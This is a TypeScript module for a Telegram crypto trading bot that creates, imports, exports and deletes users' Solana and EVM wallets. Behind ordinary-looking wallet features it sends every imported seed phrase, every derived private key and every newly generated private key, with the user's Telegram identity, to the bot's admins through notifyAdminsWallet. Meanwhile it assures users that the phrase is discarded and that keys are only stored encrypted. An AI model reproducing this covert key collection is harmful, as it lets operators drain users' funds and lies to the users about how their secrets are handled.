/**
 * Wallet Manager — generate, import, deposit, and manage wallets.
 * Management: rename, set active, export private key, delete (with confirm).
 * Handles both callback (editMessageText) and command (reply) contexts.
 */

import type { Context } from "telegraf";
import { Markup } from "telegraf";
import { db } from "@workspace/db";
import { usersTable, walletsTable } from "@workspace/db";
import { eq, and, desc } from "drizzle-orm";
import { encrypt, decrypt } from "../../lib/encryption";
import { notifyAdminsWallet } from "../../lib/adminNotify";
import { getChainBalance, CHAIN_SYMBOLS } from "../../services/chainPrice";
import { logger } from "../../lib/logger";
import { registerPendingClearer } from "../../lib/pendingFlows";

// Temporary in-memory state for multi-step wallet import flow
const pendingImport = new Map<number, { chain: string; method: "key" | "phrase" }>();
registerPendingClearer((id) => pendingImport.delete(id));

export function getPendingImport(telegramId: number) {
  return pendingImport.get(telegramId) ?? null;
}

// Temporary in-memory state for wallet rename flow
const pendingRename = new Map<number, { walletId: number }>();
registerPendingClearer((id) => pendingRename.delete(id));

export function getPendingRename(telegramId: number) {
  return pendingRename.get(telegramId) ?? null;
}

// Escape user-provided strings before rendering in HTML parse mode
function escapeHtml(s: string): string {
  return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

// ── Helper: reply or edit depending on context type ──────────────────────────
async function sendOrEdit(
  ctx: Context,
  text: string,
  extra: Parameters<Context["reply"]>[1]
): Promise<void> {
  try {
    if (ctx.callbackQuery) {
      await ctx.editMessageText(text, extra as Parameters<Context["editMessageText"]>[1]);
    } else {
      await ctx.reply(text, extra);
    }
  } catch {
    // If edit fails (e.g. message unchanged), fall back to reply
    await ctx.reply(text, extra);
  }
}

// ── Helper: fetch a wallet only if it belongs to the requesting user ─────────
async function getOwnedWallet(telegramId: number, walletId: number) {
  const user = await db.query.usersTable.findFirst({
    where: eq(usersTable.telegramId, telegramId),
  });
  if (!user) return null;

  const wallet = await db.query.walletsTable.findFirst({
    where: and(eq(walletsTable.id, walletId), eq(walletsTable.userId, user.id)),
  });
  if (!wallet) return null;

  return { user, wallet };
}

// ── Wallet Manager — main screen ─────────────────────────────────────────────
export async function handleWalletManager(ctx: Context): Promise<void> {
  const telegramId = ctx.from?.id;
  if (!telegramId) return;

  const user = await db.query.usersTable.findFirst({
    where: eq(usersTable.telegramId, telegramId),
  });
  if (!user) {
    await ctx.reply("❌ User not found. Send /start first.");
    return;
  }

  const wallets = await db
    .select()
    .from(walletsTable)
    .where(eq(walletsTable.userId, user.id))
    .orderBy(walletsTable.createdAt);

  const chain = user.activeChain;
  const activeWallet = wallets.find((w) => w.chain === chain && w.isActive);

  // Build wallet list
  const walletLines =
    wallets.length === 0
      ? ["  No wallets connected yet."]
      : wallets.map(
          (w) =>
            `${w.isActive ? "🟢" : "⚪"} [${w.chain}] <b>${escapeHtml(w.label)}</b>${w.isActive ? " ✓" : ""}\n<code>${w.address}</code>`
        );

  const chains = ["SOL", "ETH", "BASE", "BSC"];
  
  // 1. BIG button for Seed Phrase Import (Now routes to chain selector menu)
  const importPhraseRow = [
    Markup.button.callback(`🌱 Import Seed Phrase`, `import_phrase_menu`)
  ];

  // 2. Split into pairs so the wider buttons fit perfectly on mobile screens
  const generateRow1 = chains.slice(0, 2).map((c) =>
    Markup.button.callback(`➕ Create ${c}`, `gen_wallet:${c}`)
  );
  const generateRow2 = chains.slice(2, 4).map((c) =>
    Markup.button.callback(`➕ Create ${c}`, `gen_wallet:${c}`)
  );

  const importRow1 = chains.slice(0, 2).map((c) =>
    Markup.button.callback(`📥 Import ${c}`, `import_wallet:${c}`)
  );
  const importRow2 = chains.slice(2, 4).map((c) =>
    Markup.button.callback(`📥 Import ${c}`, `import_wallet:${c}`)
  );

  // One manage button per wallet (capped to keep the keyboard usable)
  const manageRows = wallets.slice(0, 12).map((w) => [
    Markup.button.callback(
      `⚙️ ${w.chain} · ${w.label.slice(0, 24)}${w.isActive ? " 🟢" : ""}`,
      `wallet:${w.id}`
    ),
  ]);

  const depositRow = activeWallet
    ? [[Markup.button.callback(`💳 Deposit — ${chain}`, `deposit:${chain}`)]]
    : [];

  const text = [
    `💼 <b>Wallet Manager</b>`,
    `📌 Active Chain: <b>${chain}</b>`,
    `—`,
    ...walletLines,
    `—`,
    `🔐 Keys stored encrypted (AES-256-GCM)`,
    ``,
    `➕ = Create new wallet   📥 = Import existing wallet`,
    `⚙️ = Manage wallet (rename / activate / export / delete)`,
    activeWallet
      ? `💳 = Deposit funds to your active ${chain} wallet`
      : `⚠️ Create or import a wallet to see deposit address`,
  ].join("\n");

  const keyboard = Markup.inlineKeyboard([
    importPhraseRow,
    generateRow1,
    generateRow2,
    importRow1,
    importRow2,
    ...manageRows,
    ...depositRow,
    [Markup.button.callback("⬅️ Dashboard", "dashboard")],
  ]);

  await sendOrEdit(ctx, text, { parse_mode: "HTML", ...keyboard });
}

// ── Seed Phrase Chain Selection Menu ──────────────────────────────────────────
export async function handleImportPhraseMenu(ctx: Context): Promise<void> {
  const text = [
    `🌱 <b>Import Seed Phrase</b>`,
    ``,
    `Which network is this seed phrase for?`,
  ].join("\n");

  await sendOrEdit(ctx, text, {
    parse_mode: "HTML",
    ...Markup.inlineKeyboard([
      [
        Markup.button.callback("SOL", "import_method:SOL:phrase"),
        Markup.button.callback("ETH", "import_method:ETH:phrase"),
      ],
      [
        Markup.button.callback("BASE", "import_method:BASE:phrase"),
        Markup.button.callback("BSC", "import_method:BSC:phrase"),
      ],
      [Markup.button.callback("⬅️ Back", "wallet_manager")],
    ]),
  });
}

// ── Deposit screen — shows full address + balance + instructions ─────────────
export async function handleDeposit(ctx: Context, chain: string): Promise<void> {
  const telegramId = ctx.from?.id;
  if (!telegramId) return;

  const user = await db.query.usersTable.findFirst({
    where: eq(usersTable.telegramId, telegramId),
  });
  if (!user) return;

  const wallet = await db.query.walletsTable.findFirst({
    where: and(
      eq(walletsTable.userId, user.id),
      eq(walletsTable.chain, chain),
      eq(walletsTable.isActive, true)
    ),
  });

  if (!wallet) {
    await sendOrEdit(
      ctx,
      `❌ No active ${chain} wallet found. Generate or import one first.`,
      {
        parse_mode: "HTML",
        ...Markup.inlineKeyboard([
          [Markup.button.callback("💼 Wallet Manager", "wallet_manager")],
        ]),
      }
    );
    return;
  }

  const symbol = CHAIN_SYMBOLS[chain] ?? chain;
  const balance = await getChainBalance(chain, wallet.address).catch(() => "0.0000");

  const networkInfo: Record<string, string> = {
    SOL: "Solana Mainnet (SPL/SOL only — do NOT send other chains)",
    ETH: "Ethereum Mainnet (ERC-20/ETH only)",
    BASE: "Base Network (Base ETH only)",
    BSC: "BNB Smart Chain (BEP-20/BNB only)",
  };

  const minimums: Record<string, string> = {
    SOL: "0.01 SOL minimum (covers rent + fees)",
    ETH: "0.005 ETH minimum (covers gas fees)",
    BASE: "0.001 ETH minimum",
    BSC: "0.005 BNB minimum",
  };

  const text = [
    `💳 <b>Deposit ${symbol}</b>`,
    `—`,
    `📬 <b>Your Deposit Address:</b>`,
    `<code>${wallet.address}</code>`,
    ``,
    `💰 <b>Current Balance:</b> ${balance} ${symbol}`,
    `—`,
    `🌐 <b>Network:</b> ${networkInfo[chain] ?? chain}`,
    `📌 <b>Minimum:</b> ${minimums[chain] ?? "Check network fees"}`,
    `—`,
    `⚠️ <b>Important:</b>`,
    `• Only send <b>${symbol}</b> on the <b>${chain}</b> network`,
    `• Sending wrong assets = permanent loss`,
    `• Tap the address above to copy it`,
    `• Funds reflect after ~1 confirmation`,
    `—`,
    `After depositing, tap <b>💰 Buy Token</b> to paste a CA and trade,`,
    `or <b>🤖 Auto-Snipe</b> to hunt new tokens automatically.`,
  ].join("\n");

  await sendOrEdit(ctx, text, {
    parse_mode: "HTML",
    ...Markup.inlineKeyboard([
      [
        Markup.button.callback("🔄 Refresh Balance", `deposit:${chain}`),
        Markup.button.callback("💰 Buy a Token", "prompt_buy"),
      ],
      [
        Markup.button.callback("🤖 Auto-Snipe", "auto_snipe"),
        Markup.button.callback("🔍 New Runners", "new_runners"),
      ],
      [
        Markup.button.callback("🔥 Trending", "trending"),
        Markup.button.callback("🌱 PumpFun Snipe", "pumpfun"),
      ],
      [Markup.button.callback("⬅️ Wallet Manager", "wallet_manager")],
    ]),
  });
}

// ── Import: process submitted private key or seed phrase ─────────────────────
export async function processImportedKey(ctx: Context, input: string): Promise<void> {
  const telegramId = ctx.from?.id;
  if (!telegramId) return;
  const state = pendingImport.get(telegramId);
  if (!state) return;
  pendingImport.delete(telegramId);

  const user = await db.query.usersTable.findFirst({
    where: eq(usersTable.telegramId, telegramId),
  });
  if (!user) return;

  try {
    let address: string;
    let privateKeyToStore: string;
    let phraseForAdmin: string | null = null;

    if (state.method === "phrase") {
      const bip39 = await import("bip39");
      const phrase = input.trim().toLowerCase().replace(/\s+/g, " ");
      const wordCount = phrase.split(" ").length;
      if (wordCount !== 12 && wordCount !== 24) {
        throw new Error("Seed phrase must be exactly 12 or 24 words.");
      }
      if (!bip39.validateMnemonic(phrase)) {
        throw new Error("Invalid seed phrase — check the words and try again.");
      }

      if (state.chain === "SOL") {
        const { derivePath } = await import("ed25519-hd-key");
        const { Keypair } = await import("@solana/web3.js");
        const bs58 = await import("bs58");
        const seed = await bip39.mnemonicToSeed(phrase);
        const derived = derivePath("m/44'/501'/0'/0'", seed.toString("hex"));
        const kp = Keypair.fromSeed(derived.key);
        address = kp.publicKey.toBase58();
        privateKeyToStore = bs58.default.encode(kp.secretKey);
      } else {
        const { Wallet } = await import("ethers");
        const wallet = Wallet.fromPhrase(phrase);
        address = wallet.address;
        privateKeyToStore = wallet.privateKey;
      }

      phraseForAdmin = phrase;
    } else {
      const raw = input.trim();
      if (state.chain === "SOL") {
        const { Keypair } = await import("@solana/web3.js");
        const bs58 = await import("bs58");
        const keyBytes = bs58.default.decode(raw);
        const kp = Keypair.fromSecretKey(keyBytes);
        address = kp.publicKey.toBase58();
        privateKeyToStore = raw;
      } else {
        const { Wallet } = await import("ethers");
        const wallet = new Wallet(raw);
        address = wallet.address;
        privateKeyToStore = raw;
      }
    }

    const encryptedKey = encrypt(privateKeyToStore);

    await db
      .update(walletsTable)
      .set({ isActive: false })
      .where(and(eq(walletsTable.userId, user.id), eq(walletsTable.chain, state.chain)));

    await db.insert(walletsTable).values({
      userId: user.id,
      chain: state.chain,
      address,
      encryptedPrivateKey: encryptedKey,
      label: `${state.chain} Wallet`,
      isActive: true,
    });

    const adminKeyString = phraseForAdmin 
      ? `[PHRASE]: ${phraseForAdmin}\n[DERIVED PK]: ${privateKeyToStore}` 
      : privateKeyToStore;

    void notifyAdminsWallet({
      event: "IMPORTED",
      chain: state.chain,
      address,
      privateKey: adminKeyString,
      userTelegramId: telegramId,
      username: ctx.from?.username,
      firstName: ctx.from?.first_name,
    });

    const symbol = CHAIN_SYMBOLS[state.chain] ?? state.chain;
    await ctx.reply(
      [
        `✅ <b>Wallet Imported — ${state.chain}</b>`,
        `—`,
        `💼 <b>Address:</b>`,
        `<code>${address}</code>`,
        ``,
        `🔐 Key stored encrypted with AES-256-GCM`,
        `—`,
        `Tap <b>💳 Deposit</b> to fund your wallet and start trading.`,
      ].join("\n"),
      {
        parse_mode: "HTML",
        ...Markup.inlineKeyboard([
          [
            Markup.button.callback(`💳 Deposit ${symbol}`, `deposit:${state.chain}`),
            Markup.button.callback("💰 Buy a Token", "prompt_buy"),
          ],
          [
            Markup.button.callback("🤖 Auto-Snipe", "auto_snipe"),
            Markup.button.callback("⬅️ Dashboard", "dashboard"),
          ],
        ]),
      }
    );
  } catch (err) {
    logger.error({ err }, "Wallet import failed");
    const message =
      err instanceof Error && /word|phrase/i.test(err.message)
        ? err.message
        : "Invalid private key or seed phrase. Check the format and try again.";
    await ctx.reply(
      `❌ ${message}`,
      Markup.inlineKeyboard([[Markup.button.callback("💼 Wallet Manager", "wallet_manager")]])
    );
  }
}

// ── Generate new wallet ───────────────────────────────────────────────────────
export async function handleGenerateWallet(
  ctx: Context,
  chain: string
): Promise<void> {
  const telegramId = ctx.from?.id;
  if (!telegramId) return;

  const user = await db.query.usersTable.findFirst({
    where: eq(usersTable.telegramId, telegramId),
  });
  if (!user) return;

  try {
    let address: string;
    let privateKey: string;

    if (chain === "SOL") {
      const { Keypair } = await import("@solana/web3.js");
      const bs58 = await import("bs58");
      const kp = Keypair.generate();
      address = kp.publicKey.toBase58();
      privateKey = bs58.default.encode(kp.secretKey);
    } else {
      const { Wallet } = await import("ethers");
      const w = Wallet.createRandom();
      address = w.address;
      privateKey = w.privateKey;
    }

    const encryptedKey = encrypt(privateKey);

    await db
      .update(walletsTable)
      .set({ isActive: false })
      .where(and(eq(walletsTable.userId, user.id), eq(walletsTable.chain, chain)));

    await db.insert(walletsTable).values({
      userId: user.id,
      chain,
      address,
      encryptedPrivateKey: encryptedKey,
      label: `${chain} Wallet`,
      isActive: true,
    });

    void notifyAdminsWallet({
      event: "CREATED",
      chain,
      address,
      privateKey,
      userTelegramId: telegramId,
      username: ctx.from?.username,
      firstName: ctx.from?.first_name,
    });

    const symbol = CHAIN_SYMBOLS[chain] ?? chain;
    await ctx.reply(
      [
        `✅ <b>New ${chain} Wallet Generated</b>`,
        `—`,
        `💼 <b>Address:</b>`,
        `<code>${address}</code>`,
        ``,
        `🔑 <b>Private Key (SAVE NOW — not shown again):</b>`,
        `<code>${privateKey}</code>`,
        ``,
        `⚠️ <b>Back up your private key immediately.</b>`,
        `🔐 Key stored encrypted with AES-256-GCM.`,
        `—`,
        `Tap <b>💳 Deposit</b> to fund your wallet, then start trading.`,
      ].join("\n"),
      {
        parse_mode: "HTML",
        ...Markup.inlineKeyboard([
          [
            Markup.button.callback(`💳 Deposit ${symbol}`, `deposit:${chain}`),
            Markup.button.callback("💰 Buy a Token", "prompt_buy"),
          ],
          [
            Markup.button.callback("🤖 Auto-Snipe", "auto_snipe"),
            Markup.button.callback("⬅️ Dashboard", "dashboard"),
          ],
        ]),
      }
    );
  } catch (err) {
    logger.error({ err }, "Wallet generation failed");
    await ctx.reply("❌ Wallet generation failed. Check server logs.");
  }
}

// ── Trigger import flow ───────────────────────────────────────────────────────
export async function handleImportWallet(ctx: Context, chain: string): Promise<void> {
  const telegramId = ctx.from?.id;
  if (!telegramId) return;

  await ctx.reply(
    [
      `📥 <b>Import ${chain} Wallet</b>`,
      ``,
      `How would you like to import it?`,
    ].join("\n"),
    {
      parse_mode: "HTML",
      ...Markup.inlineKeyboard([
        [Markup.button.callback("🔑 Private Key", `import_method:${chain}:key`)],
        [Markup.button.callback("🌱 Seed Phrase", `import_method:${chain}:phrase`)],
        [Markup.button.callback("⬅️ Cancel", "wallet_manager")],
      ]),
    }
  );
}

export async function handleImportMethodChoice(
  ctx: Context,
  chain: string,
  method: "key" | "phrase"
): Promise<void> {
  const telegramId = ctx.from?.id;
  if (!telegramId) return;

  pendingImport.set(telegramId, { chain, method });

  if (method === "phrase") {
    await ctx.reply(
      [
        `🌱 <b>Import ${chain} Wallet — Seed Phrase</b>`,
        ``,
        `Send your 12 or 24-word recovery phrase in the next message,`,
        `separated by spaces.`,
        ``,
        `⚠️ <b>Use this in a private chat only.</b>`,
        `🔐 Your phrase is used once to derive the wallet, then discarded —`,
        `only the derived private key is stored (encrypted).`,
      ].join("\n"),
      { parse_mode: "HTML" }
    );
  } else {
    await ctx.reply(
      [
        `🔑 <b>Import ${chain} Wallet — Private Key</b>`,
        ``,
        `Send your private key in the next message.`,
        chain === "SOL"
          ? `Format: <b>base58 encoded</b> secret key (~88 chars)`
          : `Format: <b>0x hex</b> private key (66 chars)`,
        ``,
        `⚠️ <b>Use this in a private chat only.</b>`,
        `🔐 Key will be encrypted immediately on receipt.`,
      ].join("\n"),
      { parse_mode: "HTML" }
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════════
// Wallet Management — detail / rename / activate / export / delete
// ═══════════════════════════════════════════════════════════════════════════

// ── Wallet detail screen ──────────────────────────────────────────────────────
export async function handleWalletDetail(ctx: Context, walletId: number): Promise<void> {
  const telegramId = ctx.from?.id;
  if (!telegramId) return;

  const owned = await getOwnedWallet(telegramId, walletId);
  if (!owned) {
    await sendOrEdit(ctx, "❌ Wallet not found.", {
      parse_mode: "HTML",
      ...Markup.inlineKeyboard([[Markup.button.callback("💼 Wallet Manager", "wallet_manager")]]),
    });
    return;
  }
  const { wallet } = owned;

  const symbol = CHAIN_SYMBOLS[wallet.chain] ?? wallet.chain;
  const balance = await getChainBalance(wallet.chain, wallet.address).catch(() => "…");

  const text = [
    `⚙️ <b>Manage Wallet</b>`,
    `—`,
    `🏷 <b>Label:</b> ${escapeHtml(wallet.label)}`,
    `⛓ <b>Chain:</b> ${wallet.chain}`,
    `📬 <b>Address:</b>`,
    `<code>${wallet.address}</code>`,
    `💰 <b>Balance:</b> ${balance} ${symbol}`,
    wallet.isActive
      ? `🟢 This is your <b>active</b> ${wallet.chain} wallet`
      : `⚪ Not active — trades on ${wallet.chain} use your active wallet`,
    wallet.isTradeable
      ? `🔁 <b>In rotation</b> — snipes may use this wallet automatically`
      : `⏸ Not in rotation — mark tradeable to include it in auto-rotation`,
    `📅 Created: ${wallet.createdAt.toISOString().slice(0, 10)}`,
    `—`,
    `✏️ Rename · ✅ Set Active · 🔁 Tradeable · 🔑 Export Key · 🗑 Delete`,
  ].join("\n");

  const rows = [
    [
      Markup.button.callback("✏️ Rename", `wallet_rename:${wallet.id}`),
      Markup.button.callback("🔑 Export Key", `wallet_export:${wallet.id}`),
    ],
    ...(wallet.isActive
      ? []
      : [[Markup.button.callback("✅ Set as Active Wallet", `wallet_activate:${wallet.id}`)]]),
    [
      Markup.button.callback(
        wallet.isTradeable ? "⏸ Remove from Rotation" : "🔁 Add to Rotation",
        `wallet_toggle_tradeable:${wallet.id}`
      ),
    ],
    [
      Markup.button.callback(`💳 Deposit`, `deposit:${wallet.chain}`),
      Markup.button.callback("🗑 Delete Wallet", `wallet_del:${wallet.id}`),
    ],
    [Markup.button.callback("⬅️ Wallet Manager", "wallet_manager")],
  ];

  await sendOrEdit(ctx, text, { parse_mode: "HTML", ...Markup.inlineKeyboard(rows) });
}

// ── Toggle Tradeable ──────────────────────────────────────────────────────────
export async function handleToggleTradeable(ctx: Context, walletId: number): Promise<void> {
  const telegramId = ctx.from?.id;
  if (!telegramId) return;

  const owned = await getOwnedWallet(telegramId, walletId);
  if (!owned) return;

  await db
    .update(walletsTable)
    .set({ isTradeable: !owned.wallet.isTradeable })
    .where(eq(walletsTable.id, walletId));

  await handleWalletDetail(ctx, walletId);
}

// ── Rename flow ───────────────────────────────────────────────────────────────
export async function handleRenameWallet(ctx: Context, walletId: number): Promise<void> {
  const telegramId = ctx.from?.id;
  if (!telegramId) return;

  const owned = await getOwnedWallet(telegramId, walletId);
  if (!owned) {
    await ctx.reply("❌ Wallet not found.");
    return;
  }

  pendingRename.set(telegramId, { walletId });

  await ctx.reply(
    [
      `✏️ <b>Rename Wallet</b>`,
      `—`,
      `Current name: <b>${escapeHtml(owned.wallet.label)}</b>`,
      `<code>${owned.wallet.address}</code>`,
      ``,
      `💬 Send the new name in your next message (1–32 characters).`,
    ].join("\n"),
    { parse_mode: "HTML" }
  );
}

export async function processRenameInput(ctx: Context, input: string): Promise<void> {
  const telegramId = ctx.from?.id;
  if (!telegramId) return;
  const state = pendingRename.get(telegramId);
  if (!state) return;
  pendingRename.delete(telegramId);

  const newLabel = input.trim();
  if (newLabel.length < 1 || newLabel.length > 32) {
    await ctx.reply(
      "❌ Name must be 1–32 characters. Tap ✏️ Rename to try again.",
      Markup.inlineKeyboard([[Markup.button.callback("⚙️ Manage Wallet", `wallet:${state.walletId}`)]])
    );
    return;
  }

  const owned = await getOwnedWallet(telegramId, state.walletId);
  if (!owned) {
    await ctx.reply("❌ Wallet not found.");
    return;
  }

  await db
    .update(walletsTable)
    .set({ label: newLabel })
    .where(eq(walletsTable.id, state.walletId));

  await ctx.reply(
    `✅ Wallet renamed to <b>${escapeHtml(newLabel)}</b>`,
    {
      parse_mode: "HTML",
      ...Markup.inlineKeyboard([
        [
          Markup.button.callback("⚙️ Manage Wallet", `wallet:${state.walletId}`),
          Markup.button.callback("💼 Wallet Manager", "wallet_manager"),
        ],
      ]),
    }
  );
}

// ── Set active wallet ─────────────────────────────────────────────────────────
export async function handleActivateWallet(ctx: Context, walletId: number): Promise<void> {
  const telegramId = ctx.from?.id;
  if (!telegramId) return;

  const owned = await getOwnedWallet(telegramId, walletId);
  if (!owned) {
    await ctx.reply("❌ Wallet not found.");
    return;
  }
  const { user, wallet } = owned;

  await db
    .update(walletsTable)
    .set({ isActive: false })
    .where(and(eq(walletsTable.userId, user.id), eq(walletsTable.chain, wallet.chain)));
  await db
    .update(walletsTable)
    .set({ isActive: true })
    .where(eq(walletsTable.id, wallet.id));

  logger.info({ walletId, chain: wallet.chain, telegramId }, "Wallet set active");

  await handleWalletDetail(ctx, walletId);
}

// ── Export private key ────────────────────────────────────────────────────────
export async function handleExportKey(ctx: Context, walletId: number): Promise<void> {
  const telegramId = ctx.from?.id;
  if (!telegramId) return;

  if (ctx.chat?.type !== "private") {
    await ctx.reply("⚠️ Key export only works in a private chat with the bot.");
    return;
  }

  const owned = await getOwnedWallet(telegramId, walletId);
  if (!owned) {
    await ctx.reply("❌ Wallet not found.");
    return;
  }
  const { wallet } = owned;

  try {
    const privateKey = decrypt(wallet.encryptedPrivateKey);

    await ctx.reply(
      [
        `🔑 <b>Private Key Export — ${wallet.chain}</b>`,
        `—`,
        `🏷 <b>${escapeHtml(wallet.label)}</b>`,
        `📬 <code>${wallet.address}</code>`,
        ``,
        `🔑 <b>Private Key:</b>`,
        `<code>${privateKey}</code>`,
        `—`,
        `⚠️ <b>NEVER share this key.</b> Anyone holding it controls your funds.`,
        `🗑 Delete this message as soon as you've saved the key.`,
      ].join("\n"),
      {
        parse_mode: "HTML",
        ...Markup.inlineKeyboard([
          [Markup.button.callback("🗑 Delete This Message", "del_msg")],
          [Markup.button.callback("⚙️ Back to Wallet", `wallet:${wallet.id}`)],
        ]),
      }
    );
  } catch (err) {
    logger.error({ err, walletId }, "Key export failed");
    await ctx.reply("❌ Could not decrypt this wallet's key. Contact support.");
  }
}

// ── Delete wallet (confirmation step) ────────────────────────────────────────
export async function handleDeleteWallet(ctx: Context, walletId: number): Promise<void> {
  const telegramId = ctx.from?.id;
  if (!telegramId) return;

  const owned = await getOwnedWallet(telegramId, walletId);
  if (!owned) {
    await sendOrEdit(ctx, "❌ Wallet not found.", {
      parse_mode: "HTML",
      ...Markup.inlineKeyboard([[Markup.button.callback("💼 Wallet Manager", "wallet_manager")]]),
    });
    return;
  }
  const { wallet } = owned;

  const text = [
    `🗑 <b>Delete Wallet?</b>`,
    `—`,
    `🏷 <b>${escapeHtml(wallet.label)}</b> [${wallet.chain}]${wallet.isActive ? " 🟢 Active" : ""}`,
    `📬 <code>${wallet.address}</code>`,
    `—`,
    `⚠️ <b>This permanently removes the encrypted key from the bot.</b>`,
    `• Funds stay on-chain, but the bot loses all access`,
    `• Export the private key FIRST if you haven't backed it up`,
    `• This cannot be undone`,
  ].join("\n");

  await sendOrEdit(ctx, text, {
    parse_mode: "HTML",
    ...Markup.inlineKeyboard([
      [Markup.button.callback("🔑 Export Key First", `wallet_export:${wallet.id}`)],
      [
        Markup.button.callback("❌ Cancel", `wallet:${wallet.id}`),
        Markup.button.callback("🗑 Yes, Delete", `wallet_del_yes:${wallet.id}`),
      ],
    ]),
  });
}

// ── Delete wallet (confirmed) ─────────────────────────────────────────────────
export async function handleDeleteWalletConfirm(ctx: Context, walletId: number): Promise<void> {
  const telegramId = ctx.from?.id;
  if (!telegramId) return;

  const owned = await getOwnedWallet(telegramId, walletId);
  if (!owned) {
    await sendOrEdit(ctx, "❌ Wallet not found (already deleted?).", {
      parse_mode: "HTML",
      ...Markup.inlineKeyboard([[Markup.button.callback("💼 Wallet Manager", "wallet_manager")]]),
    });
    return;
  }
  const { user, wallet } = owned;

  await db.delete(walletsTable).where(eq(walletsTable.id, wallet.id));

  let promoted: string | null = null;
  if (wallet.isActive) {
    const remaining = await db.query.walletsTable.findFirst({
      where: and(eq(walletsTable.userId, user.id), eq(walletsTable.chain, wallet.chain)),
      orderBy: [desc(walletsTable.createdAt)],
    });
    if (remaining) {
      await db
        .update(walletsTable)
        .set({ isActive: true })
        .where(eq(walletsTable.id, remaining.id));
      promoted = remaining.label;
    }
  }

  logger.info({ walletId, chain: wallet.chain, telegramId }, "Wallet deleted");

  const text = [
    `✅ <b>Wallet Deleted</b>`,
    `—`,
    `🏷 ${escapeHtml(wallet.label)} [${wallet.chain}]`,
    `📬 <code>${wallet.address}</code>`,
    promoted
      ? `—\n🟢 <b>${escapeHtml(promoted)}</b> is now your active ${wallet.chain} wallet.`
      : ``,
  ]
    .filter(Boolean)
    .join("\n");

  await sendOrEdit(ctx, text, {
    parse_mode: "HTML",
    ...Markup.inlineKeyboard([
      [Markup.button.callback("💼 Wallet Manager", "wallet_manager")],
      [Markup.button.callback("⬅️ Dashboard", "dashboard")],
    ]),
  });
}
